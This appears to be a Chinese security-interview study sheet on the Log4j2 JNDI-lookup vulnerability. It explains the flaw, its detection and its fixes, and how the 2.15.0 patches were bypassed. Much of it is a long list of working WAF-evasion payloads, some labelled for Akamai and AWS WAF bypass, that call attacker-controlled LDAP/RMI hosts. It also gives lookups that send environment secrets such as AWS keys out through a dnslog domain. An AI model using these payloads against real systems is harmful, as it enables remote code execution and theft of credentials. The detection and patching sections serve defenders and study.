## Log4j2

### 谈谈Log4j2漏洞（★★）[+]

漏洞原理其实不难，简单来说就是对于`${jndi:}`格式的日志默认执行`JndiLoop.lookup`导致的RCE。日志的任何一部分插入`${}`都会进行递归处理，也就是说`log.info/error/warn`等方法如果日志内容可控，就会导致这个问题。这个漏洞本身不复杂，后续的绕过比较有趣



### Log4j2漏洞的黑盒检测（★）[+]

由于该漏洞的特性，必须要出网才可以检测，例如`dnslog`的方式

在内网中也可不使用`dnslog`而是自行实现伪`JDNI/LDAP`的服务端用于探测



### Log4j2漏洞的白盒检测（★）[+]

检查`pom.xml`或`gradle`中的依赖，是否存在`log4j2-api`和`log4j2-core`小于`2.15.0`则存在漏洞



### Log4j2的紧急修复手段（★★）

在JVM参数中添加`-Dlog4j2.formatMsgNoLookups=true`

系统环境变量中将`LOG4J_FORMAT_MSG_NO_LOOKUPS`设置为`true`

创建`log4j2.component.properties`文件并增加配置`log4j2.formatMsgNoLookups=true`

不重启应用情况下的修复手段参考另一个问题



### 知道Log4j2 2.15.0 RC1修复的绕过吗（★★★）

修复内容限制了协议和HOST以及类型，其中类型这个东西其实没用，协议的限制中包含了`LDAP`等于没限制。重点在于HOST的限制，只允许本地localhost和127.0.0.1等IP。但这里出现的问题是，加入了限制但没有捕获异常，如果产生异常会继续`lookup`所以如果在URL中加入一些特殊字符，例如空格，即可导致异常绕过HOSOT限制，然后`lookup`触发RCE



### Log4j2的两个DOS CVE了解吗（★★）[+]

其中一个DOS是`lookup`本身延迟等待和允许多个标签`${}`导致的问题

另一个DOS是嵌套标签`${}`递归解析导致栈溢出



### Log4j2 2.15.0正式版的绕过了解吗（★★★）

正式版的修复只是在之前基础上捕获了异常。这个绕过本质还是绕HOST限制。使用`127.0.0.1#evil.com`即可绕过，需要服务端配置泛域名，所以#前的127.0.0.1会被认为是某个子域名，而本地解析认为这是127.0.0.1绕过了HOST的限制。但该RCE仅可以在MAC OS和部分Linux平台成功



### Log4j2绕WAF的手段有哪些（★★）[+]

使用类似`${::-J}`的方式做字符串的绕过，还可以结合`upper`和`lower`标签进行嵌套

有一些特殊字符的情况结合大小写转换有巧妙的效果，还可以加入垃圾字符

例如：`${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}`

Akamai Bypass Log4j

```md
${jndi${123%25ff:-}:ldap://HOST:PORT/a}
```

#### Amazon AWS WAf Bypass

```md
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://HOST:PORT/a}

${jnd${123%25ff:-${123%25ff:-i:}}ldap://HOST:PORT/a}
```

### 其他的绕过payloads

```md
${lower:${:a:d:-${lower:}}jndi:}

${jndi:ldap://attacker.com/a}

${j${upper:${lower:n}}di:ldap://attacker.com/a}

${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker.com/a}

${${env:BARFOO:-j}Ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}

${${::-j}ndi:rmi://127.0.0.1:1389/ass}

${jndi:rmi://a.b.c}

${${lower:jndi}:${lower:rmi}://q.w.e/poc}

${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://l}

${${::-j}ndi:rmi://}

${${lower:jndi}:${lower:rmi}://}

${${lower:${lower:jndi}}:${lower:rmi}://

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}:}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}

${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}

${jndi:rmi://adsasd.asdasd.asdasd}

${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}

${j${upper:n:-}di:ldap://example.com:1389

${j${k8s:k5:-ND}i${sd:k5:-:}ldap://kjhkjhkjh}

${j${main:\k5:-Nd}i${spring:k5:-:}ldap://kjhkjhkjh}

${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://kjhkjhkjh}

${j${::-nD}i${::-:}ldap://kjhkjhkjh}

${j${EnV:K5:-nD}i:ldap://kjhkjhkjh}

${j${loWer:Nd}i${uPper::}ldap}

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}//your.burpcollaborator.net/a}

${${upper:}jndi:ldap://example.com/a}

${j${upper::-n}di:ldap://example.com:1389/a}

${"£$_"£:a:d:-${lower:j}n}di:

${:a:d:-${lower:}j}ndi:

${:a:d:-${lower:j}n}di:
```





### Log4j2除了RCE还有什么利用姿势（★★★）[+]

利用其他的`lookup`可以做信息泄露例如`${env:USER}`和`${env:AWS_SECRET_ACCESS_KEY}`

在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息，不过`SpringBoot`默认不使用`log4j2`

这些敏感信息可以利用`dnslog`外带`${jndi:ldap://${java:version}.xxx.dnslog.cn}`



### 不停止运行程序如何修复Log4j2漏洞（★★★）

利用JavaAgent改JVM中的字节码，可以直接删了`JndiLookup`的功能

有公众号提出类似`Shiro`改`Key`的思路，利用反射把`JndiLookup`删了也是一种办法


### Log4j2调试源码过程中为什么无法在关键处下断点（★★）

（来自于某师傅的反馈）

在最后进入`lookup`时，有一部用到了`try-resources`语法，这种情况下如果对反编译的`class`文件下断点会存在问题

解决方案是下载源码绑定到`IDEA`后在未反编译的`Java`代码中下断点调试


### Log4j2是否存在不出网的利用（★★）[+]

（来自于某师傅的反馈：红队实习面试题）

不可能存在不出网的利用，也就是说不出网情况下不可能`RCE`

由JNDI注入的基本原理可以得知，如果网络无法到达`JNDI Server`那么获取不到数据，无论是`Reference`的方式或者高版本`javaSerializedData`打本地`gadget`或者本地工厂类，任何一种利用方式的前提条件是能够收到数据，而不出网无法获得数据